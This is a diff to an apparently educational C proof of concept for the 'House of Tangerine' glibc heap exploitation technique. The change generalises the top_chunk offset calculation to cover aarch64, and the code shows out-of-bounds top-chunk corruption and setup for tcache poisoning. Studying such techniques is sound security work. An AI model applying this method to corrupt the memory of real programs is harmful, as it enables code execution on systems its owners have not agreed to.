@@ -30,7 +30,7 @@
 #define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)
 
 /**
- * Tested on GLIBC 2.34 (x86_64 & x86) & 2.39 (x86_64 & x86)
+ * Tested on GLIBC 2.34 (x86_64, x86 & aarch64) & 2.39 (x86_64, x86 & aarch64)
  *
  * House of Tangerine is the modernized version of House of Orange
  * and is able to corrupt heap without needing to call free() directly
@@ -90,11 +90,7 @@ int main() {
   heap_ptr = malloc(size_2);
 
   // use BOF or OOB to corrupt to the top_chunk
-#if __amd64__
-  top_size_ptr = &heap_ptr[(size_2/SIZE_SZ)+1];
-#else
-  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) + 3];
-#endif
+  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];
 
   top_size = *top_size_ptr;
 
@@ -136,7 +132,7 @@ int main() {
   assert(freed_top_size == CHUNK_SIZE_1);
 
   // this will be our vuln_tcache for tcache poisoning
-  vuln_tcache = (size_t) & heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
+  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];
 
   printf("tcache next ptr: 0x%lx\n", vuln_tcache);
 
